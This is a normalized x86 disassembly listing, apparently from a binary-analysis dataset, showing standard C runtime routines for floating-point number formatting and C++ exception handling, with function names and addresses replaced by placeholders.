mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
cmp [ ebp - 0x4 ] cl
pop esi
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41fb10
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_403014
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
test cl cl
mov esi [ ebp - 0x10 ]
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
test cl cl
mov [ eax ] cl
jne r-xdata
dec eax
sub_41fba6
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_421393
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_4212ed
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_41fbfd
test edi edi
push esi
mov esi eax
je r-xdata
pop esi
retn
push esi
call sub_405d10
inc eax
push eax
push esi
add esi edi
push esi
call sub_4026b0
add esp 0x10
sub_41fc36
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_403014
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_406b99
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_406b99
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_41fbfd
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_406efa
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
lea ecx [ esi + 0x2 ]
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_406dfe
add esp 0x14
push r--data
push ebx
push esi
call sub_405b8a
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_4026b0
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_41fda3
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_4215b1
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_406b99
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_406efa
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
mov esi [ ebp + 0x14 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409038
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_41fc36
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_421439
add esp 0x10
cmp eax ebx
je r-xdata
sub_41fe8f
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_403014
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_406b99
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
cmp [ ebp + 0x10 ] eax
mov [ esi ] 0x0
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_406b99
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_406efa
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_41fe71
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
cmp [ ebp + 0x14 ] edx
mov [ ebp + 0xc ] eax
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_4212c0
test eax eax
pop ecx
pop ecx
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_41f5d0
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_41f5d0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_4031e0
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_41f5d0
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_421640
add al 0x30
mov [ esi ] al
inc esi
cmp esi edi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_421640
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_421640
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_420200
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_403014
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_406b99
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_406efa
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_41fbfd
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_41fbfd
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_41fbfd
push edi
push 0x30
push esi
call sub_4031e0
add esp 0xc
sub_4202f5
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_4215b1
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_406b99
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_406efa
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409038
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_420200
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_421439
add esp 0x10
cmp eax ebx
je r-xdata
sub_4203ae
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_4215b1
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_406b99
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_406efa
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
cmp ecx 0xffffffff
lea edi [ eax + esi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409038
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_421439
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_41fc36
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_420200
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_4204a6
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41fda3
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4202f5
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41fe8f
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4203ae
jmp r-xdata
sub_42052c
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4204a6
add esp 0x1c
pop ebp
retn
sub_42054d
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_42171f
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_406dfe
add esp 0x14
sub_4205b2
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
push 0x0
call eax
retn
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_420608
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_4059e0
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
je r-xdata
sub_420664
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_405021
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
retn
call sub_405021
add eax 0x90
dec [ eax ]
call sub_405021
and [ eax + 0x90 ] 0x0
jmp sub_405af6
sub_4206a8
push 0x10
push r--data
call sub_405770
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42076e
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_405021
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_4057b5
retn
call sub_405b42
call sub_405b42
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_421270
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_420789
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_405021
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_4207ce
push 0x8
push r--data
call sub_405770
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_4057b5
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_41f708
mov [ ebp - 0x4 ] 0xfffffffe
sub_420822
mov ecx [ esp + 0x8 ]
mov eax [ ecx ]
push esi
mov esi [ esp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_420847
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_405b42
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
test ebx ebx
lea esi [ eax + 0x4 ]
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_420608
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_420909
push 0x2c
push r--data
call sub_405770
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_41f9ac
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_405021
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_405021
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_405021
mov [ eax + 0x88 ] esi
call sub_405021
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_41fa41
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_420a2f
mov eax [ ebp - 0x1c ]
call sub_4057b5
retn
sub_4209a2
mov esp [ ebp - 0x18 ]
call sub_405021
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_4206a8
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_420a2f
mov eax [ ebp - 0x1c ]
call sub_4057b5
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_420a2f
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_41f9f5
pop ecx
call sub_405021
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_405021
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_41f9d4
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_4207ce
pop ecx
pop ecx
sub_420aa5
push 0xc
push r--data
call sub_405770
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
